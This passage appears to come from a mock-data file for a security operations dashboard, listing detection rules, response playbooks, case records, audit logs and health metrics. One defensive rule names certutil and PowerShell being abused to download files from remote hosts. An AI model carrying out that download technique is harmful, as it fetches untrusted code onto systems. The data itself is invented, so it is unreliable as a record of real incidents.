  { id: "RULE-04", name: "Password Spraying & Brute Force", mitreId: "T1110.003", technique: "Password Spraying", type: "Threshold", severity: "high", enabled: true, triggers24h: 8, fidelityScore: 92, description: "Flags >=10 failed authentications across distinct usernames from a shared CIDR within 5 minutes." },
  { id: "RULE-05", name: "DNS Query Tunneling & Length", mitreId: "T1071.004", technique: "DNS C2 Protocol", type: "Pattern Match", severity: "high", enabled: true, triggers24h: 5, fidelityScore: 89, description: "Monitors TXT/NULL record queries with Shannon entropy > 4.2 and query length > 65 characters." },
  { id: "RULE-06", name: "Process Ingestion: certutil / powershell", mitreId: "T1059.001", technique: "PowerShell", type: "Pattern Match", severity: "high", enabled: true, triggers24h: 6, fidelityScore: 91, description: "Flags lolbin binary usage to download files from remote Internet locations." },
  { id: "RULE-07", name: "Isolation Forest Behavioral Outlier", mitreId: "T1036", technique: "Masquerading", type: "Unsupervised ML", severity: "medium", enabled: true, triggers24h: 11, fidelityScore: 84, description: "Unsupervised machine learning model identifying anomalous host activity patterns outside baseline." },
  { id: "RULE-08", name: "Suspicious Windows Service Registration", mitreId: "T1543.003", technique: "Windows Service", type: "Pattern Match", severity: "medium", enabled: true, triggers24h: 4, fidelityScore: 88, description: "Alerts when a new Windows service is registered pointing to a user writable directory (Temp or AppData)." },
];

export const RESPONSE_PLAYBOOKS: ResponsePlaybook[] = [
  { id: "PB-01", name: "Isolate Compromised Host via EDR", description: "Cuts all network connectivity to the target asset except for SOC forensics communication.", category: "Containment", approvalRequired: false, automated: true, lastRun: "2026-10-22 19:36", successRate: 100, executionsCount: 42 },
  { id: "PB-02", name: "Revoke User Credentials & Invalidate Active Sessions", description: "Expires Kerberos tickets, revokes OAuth/JWT refresh tokens, and disables Active Directory login.", category: "Containment", approvalRequired: true, automated: false, lastRun: "2026-10-22 19:26", successRate: 98, executionsCount: 68 },
  { id: "PB-03", name: "Perimeter Edge IP Null-Route & Firewall Block", description: "Injects malicious IP into border BGP null-routes and Palo Alto perimeter dynamic block lists.", category: "Containment", approvalRequired: false, automated: true, lastRun: "2026-10-22 19:15", successRate: 100, executionsCount: 154 },
  { id: "PB-04", name: "Live Memory Acquisition & Volatility Dump", description: "Takes an encrypted snapshot of system volatile memory and stores it in secure evidence vault.", category: "Investigation", approvalRequired: false, automated: true, lastRun: "2026-10-22 19:34", successRate: 95, executionsCount: 29 },
  { id: "PB-05", name: "DNS Sinkhole Poisoning", description: "Directs all corporate internal DNS lookups for suspect domains to an isolated analysis sinkhole.", category: "Eradication", approvalRequired: false, automated: true, lastRun: "2026-10-22 19:20", successRate: 100, executionsCount: 88 },
];

export const CASES_LIST: CaseRecord[] = [
  { id: "CASE-2026-089", title: "Targeted Multi-Stage Intrusion on db-core-02", incidentId: "INC-001", priority: "P1 - Critical", status: "In Progress", assignee: "Security Analyst (You)", openedAt: "2026-10-22 19:15", slaRemaining: "0h 45m", notesCount: 7 },
  { id: "CASE-2026-088", title: "Cobalt Strike Command & Control on web-gw-01", incidentId: "INC-002", priority: "P1 - Critical", status: "In Progress", assignee: "David Miller", openedAt: "2026-10-22 18:45", slaRemaining: "1h 15m", notesCount: 4 },
  { id: "CASE-2026-087", title: "Active Directory Spray & Ingress Investigation", incidentId: "INC-003", priority: "P2 - High", status: "Pending Review", assignee: "Sarah Connor", openedAt: "2026-10-22 17:30", slaRemaining: "3h 30m", notesCount: 12 },
  { id: "CASE-2026-086", title: "Perimeter Port Sweep Attacker Profiling", incidentId: "INC-004", priority: "P3 - Medium", status: "Closed", assignee: "Auto-Responder", openedAt: "2026-10-22 19:10", slaRemaining: "Resolved", notesCount: 2 },
];

export const AUDIT_LOGS: AuditRecord[] = [
  { id: 10941, timestamp: "2026-10-22 19:36:12", actor: "admin_sec", role: "ADMINISTRATOR", action: "PLAYBOOK_TRIGGER", target: "PB-01: Isolate db-core-02", ipAddress: "10.0.1.50", status: "SUCCESS" },
  { id: 10940, timestamp: "2026-10-22 19:35:45", actor: "admin_sec", role: "ADMINISTRATOR", action: "INCIDENT_STATUS_CHANGE", target: "INC-001 (triaged -> new)", ipAddress: "10.0.1.50", status: "SUCCESS" },
  { id: 10939, timestamp: "2026-10-22 19:26:01", actor: "sarah.connor", role: "SECURITY_ANALYST", action: "PLAYBOOK_REQUEST", target: "PB-02: Revoke alex.mercer", ipAddress: "10.0.1.52", status: "SUCCESS" },
  { id: 10938, timestamp: "2026-10-22 19:25:50", actor: "david.miller", role: "INCIDENT_RESPONDER", action: "PLAYBOOK_APPROVAL", target: "PB-02: Approved for alex.mercer", ipAddress: "10.0.1.55", status: "SUCCESS" },
  { id: 10937, timestamp: "2026-10-22 19:15:30", actor: "system_engine", role: "SYSTEM", action: "FIREWALL_ACL_UPDATE", target: "Blocked 103.152.18.22", ipAddress: "127.0.0.1", status: "SUCCESS" },
  { id: 10936, timestamp: "2026-10-22 19:10:02", actor: "viewer_guest", role: "READ_ONLY_VIEWER", action: "EXPORT_ATTEMPT", target: "Security Events CSV", ipAddress: "10.0.3.99", status: "DENIED" },
];

export const SYSTEM_HEALTH_METRICS = {
  overallStatus: "Optimal",
  uptime: "99.98%",
  components: [
    { name: "PostgreSQL Database Engine (v16.3)", status: "HEALTHY", latencyMs: 2.8, load: "14%", details: "Active connections: 28/200, Flyway migrations applied: V1, V2" },
    { name: "Redis Memory Cache (v7.2)", status: "HEALTHY", latencyMs: 0.9, load: "8%", details: "Memory used: 142 MB, Hit ratio: 98.4%" },
    { name: "Realtime Ingestion Pipeline", status: "HEALTHY", latencyMs: 4.1, load: "22%", details: "Throughput: 850 events/sec, Zero dropped packets" },
    { name: "Deterministic Rules Engine", status: "HEALTHY", latencyMs: 1.2, load: "18%", details: "8 detection rules evaluated concurrently" },
    { name: "Unsupervised Isolation Forest Engine", status: "HEALTHY", latencyMs: 12.4, load: "34%", details: "Model seed: 7, Window: 300s, Scikit-learn backend" },
    { name: "SIEM Threat Intelligence Feed Sync", status: "HEALTHY", latencyMs: 110.0, load: "2%", details: "Last synchronized: 12 mins ago, 1,480 IOCs active" },
  ],
};
